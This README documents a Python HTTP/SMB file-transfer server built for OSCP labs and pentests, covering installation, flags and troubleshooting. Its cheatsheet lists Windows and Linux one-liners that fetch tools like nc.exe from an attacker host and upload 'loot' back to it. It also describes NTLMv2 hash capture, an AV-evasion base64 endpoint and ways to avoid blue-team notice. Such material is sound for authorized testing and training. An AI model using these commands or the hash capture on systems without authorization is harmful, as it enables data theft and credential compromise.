# DualServe — HTTP + SMB File Transfer Server

A single-file Python server for moving files in and out of boxes during OSCP labs, internal admin work, and authorized pentests. Drop-in replacement for `python -m http.server` when you actually need to do work.

> ⚠️ **Authorized use only.** Run this on networks and hosts you own or have explicit written permission to test. SMB mode captures NTLMv2 hashes from anything that authenticates to the share — don't expose it to networks where you don't want that responsibility.

---

## Why bother

`python -m http.server` is fine until you need to:

- Upload from a victim back to your box (it can't)
- Drop an SMB share for `copy \\you\evil\nc.exe .` from a Windows shell
- Catch NTLMv2 hashes when something authenticates
- Browse a recursive listing of your tools directory
- Get MD5s and progress bars for sanity-checking transfers
- Have copy-paste-ready download/upload one-liners staring at you in the terminal the moment the server starts

That's what this is.

---

## Features

**HTTP**
- Recursive file browser at `/files` with live search
- JSON file index at `/list` (paths, sizes, MD5s)
- `PUT` and `POST` (multipart + raw) uploads
- Base64 download helper at `/b64/<file>` for AV-evasion-flavored copy/paste
- Transfer log at `/log`
- Per-transfer MD5 + real-time progress bar in the console

**SMB** (via `impacket-smbserver`)
- Anonymous or authenticated shares
- SMB2 on by default, toggleable
- NTLMv2 hash capture, printed in red
- Connection / share / file-op classification with catchers for retry storms, signing rejection, port-scan probes, and unexpected source IPs

**Quality of life**
- Auto-detects `tun0` / `tap0` / `eth0` / `wlan0` and prints download/upload one-liners pre-filled with your VPN IP
- Color-coded console output by file type
- Filename-based extension highlighting (`.exe`/`.dll` red, `.ps1` blue, `.sh` green, etc.)

---

## Requirements

- Python **3.10+** (works on 3.13/3.14 with one extra package — see below)
- `impacket` (only if you want the `-smb` features)

### Python 3.13+ note

The script imports `cgi`, which was removed from the stdlib in Python 3.13. On distros that ship modern Python (Arch, CachyOS, Fedora 40+), install the shim:

```bash
sudo pip install --break-system-packages legacy-cgi
```

Use `sudo` if you plan to run the server with `sudo` (default ports 80/445 require it). Otherwise drop the `sudo` and the script runs from your user env. **Do not use `pip install --user` if you also use `sudo` to launch** — root won't see user-installed packages.

---

## Install

### Kali / Debian / Ubuntu

```bash
sudo apt install python3-impacket
git clone https://github.com/1337codes/OSCP-HTTP-SMB-File-Transfer-Server
cd OSCP-HTTP-SMB-File-Transfer-Server
```

### Arch / CachyOS / BlackArch

```bash
sudo pacman -S impacket python-pip
sudo pip install --break-system-packages legacy-cgi
git clone https://github.com/1337codes/OSCP-HTTP-SMB-File-Transfer-Server
cd OSCP-HTTP-SMB-File-Transfer-Server
```

### Fedora / RHEL

```bash
sudo dnf install python3-impacket
sudo pip install --break-system-packages legacy-cgi   # if Python ≥ 3.13
git clone https://github.com/1337codes/OSCP-HTTP-SMB-File-Transfer-Server
cd OSCP-HTTP-SMB-File-Transfer-Server
```

### Configure your default download directory

The script ships with a hardcoded path the author uses. Either always pass `-dir`, or edit the default once:

```bash
sed -i "s|/home/alien/Desktop/OSCP/Tools|$HOME/oscp/tools|" tools.py
mkdir -p ~/oscp/tools
```

---

## Usage

### Basic

```bash
sudo python tools.py                     # HTTP only on :80, default download dir
sudo python tools.py -smb                # HTTP :80 + SMB :445, anonymous "evil" share
python tools.py -p 8080 -sp 4445 -smb    # non-privileged ports, no sudo
python tools.py -dir /tmp/loot           # serve a different directory
```

### SMB options

```bash
tools.py -smb -smbshare tools                      # custom share name (default: evil)
tools.py -smb -smbuser admin -smbpass hunter2      # require auth
tools.py -smb -no-smb2                             # SMB1 only (legacy targets)
```

### All flags

| Flag | Default | Description |
|---|---|---|
| `-p` | 80 | HTTP port |
| `-dir` | `$DEFAULT_DOWNLOAD_DIR` | Directory to serve files from |
| `-smb` | off | Enable SMB server |
| `-sp` | 445 | SMB port |
| `-smbshare` | `evil` | SMB share name |
| `-smbuser` | (anon) | SMB username for auth |
| `-smbpass` | (anon) | SMB password for auth |
| `-no-smb2` | off | Disable SMB2 (force SMB1) |

Uploads always land in your **current working directory** at server start — `cd` somewhere safe before launching.

---

## Endpoints

| Path | What it does |
|---|---|
| `/` | Standard directory index |
| `/files` | Recursive browser with search box and ready-to-paste commands |
| `/list` | JSON: every file with size + MD5 |
| `/b64/<file>` | Base64-encoded copy of the file with PowerShell + Linux decode one-liners |
| `/log` | Last 50 transfers |
| `PUT /<filename>` | Upload (raw body) |
| `POST /<filename>` | Upload (raw or multipart) |

---

## Client-side cheatsheet

The server prints these on startup, pre-filled with your IP. Reproduced here for reference. Replace `YOU` with your IP:port.

### Windows download

```powershell
iwr -uri http://YOU/FILE -outfile FILE
(New-Object Net.WebClient).DownloadFile('http://YOU/FILE','FILE')
certutil -urlcache -split -f http://YOU/FILE FILE       # cmd.exe
curl.exe http://YOU/FILE -o FILE                        # Win10+
```

### Windows upload

```powershell
curl.exe -X PUT http://YOU/loot.zip --data-binary "@loot.zip"
iwr -Uri http://YOU/loot.zip -Method PUT -InFile loot.zip
(New-Object Net.WebClient).UploadFile('http://YOU/loot.zip','loot.zip')
```

### Windows SMB (with `-smb`)

```cmd
copy \\YOU\evil\nc.exe .
copy loot.zip \\YOU\evil\loot.zip
dir \\YOU\evil
```

### Linux download / upload

```bash
curl http://YOU/FILE -o FILE
wget http://YOU/FILE
curl -T loot.tar.gz http://YOU/                          # PUT upload
curl -F "files=@loot.tar.gz" http://YOU/                 # multipart upload
```

---

## Convenience: shell alias

Save the long invocation as `tools` so you can launch from anywhere.

**Bash / Zsh** — append to `~/.bashrc` or `~/.zshrc`:

```bash
alias tools='sudo python /path/to/tools.py'
```

**Fish** — append to `~/.config/fish/config.fish`:

```fish
alias tools 'sudo python /path/to/tools.py'
```

Or as a fish function with arg passthrough (cleaner, persists on its own):

```fish
function tools; sudo python /path/to/tools.py $argv; end
funcsave tools
```

Reload your shell or `source` the config, then:

```bash
tools -smb
tools -p 8080 -dir ~/oscp/loot
```

---

## Troubleshooting

### `ModuleNotFoundError: No module named 'cgi'`

You're on Python 3.13+ and the shim isn't installed for the user actually running the script. If you launch with `sudo`, install it for root:

```bash
sudo pip install --break-system-packages legacy-cgi
```

If you installed with `pip install --user`, that only works for **your** user — `sudo` runs as root and won't see it.

### `[Errno 13] Permission denied` on bind

Default ports 80 and 445 require root. Either run with `sudo`, or use unprivileged ports:

```bash
python tools.py -p 8080 -sp 4445 -smb
```

Note: Windows SMB clients can't easily connect to a non-445 share without registry tweaks, so for SMB work you generally want `sudo` + port 445.

### IP shows as `127.0.0.1` in the banner

The script greps `ip -4 addr show` for `tun0`, `tap0`, `eth0`, `ens33`, `ens160`, `wlan0`. Modern systemd predictable names (e.g. `enp0s3`, `wlp2s0`) aren't in that list. The server still binds `0.0.0.0` correctly — only the banner is wrong. Edit the `interfaces` list near `get_all_ips()` in `tools.py` to add yours, or just `ip -4 a` to grab the address yourself.

### `impacket-smbserver: command not found`

The SMB feature requires the impacket CLI tools. On Arch the package is `impacket` (not `python3-impacket` like the original docs said). On Debian/Kali it's `python3-impacket` plus optionally `impacket-scripts` for the `impacket-*` symlinks.

### SMB starts but nothing connects

- Check the firewall — `ufw`, `firewalld`, or your VPN provider may be blocking 445.
- Some Windows clients refuse to negotiate without SMB signing if the share looks suspicious. Try `-smbuser` / `-smbpass` instead of anonymous.
- Hash capture only fires when a client *attempts auth* — anonymous browsing won't produce one.

### Port 445 already in use

Linux distros sometimes have Samba running by default. Stop it before launching:

```bash
sudo systemctl stop smb smbd nmb nmbd 2>/dev/null
```

---

## OPSEC notes

- Hashes captured by SMB are NTLMv2; they're crackable with hashcat mode `5600`. They're useless for pass-the-hash without further work.
- The base64 download endpoint caps files at 1 MB. For larger payloads use the regular HTTP download.
- Transfer log is in-memory only — restart wipes it. If you need persistence, redirect stdout to a file.
- The HTTP server has **zero authentication**. Anyone who can reach the port can read or upload. Bind to a specific interface (or a VPN tun) at the OS level if that matters.
- Default share name is `evil` — not subtle. Use `-smbshare tools` or similar if blue team is watching share names.

---

## License / Credit

Original by [@1337codes](https://github.com/1337codes/OSCP-HTTP-SMB-File-Transfer-Server). This README is a community-contributed expansion — install steps, troubleshooting, and the Python 3.13+ fix added based on real-world use on CachyOS and other modern distros.
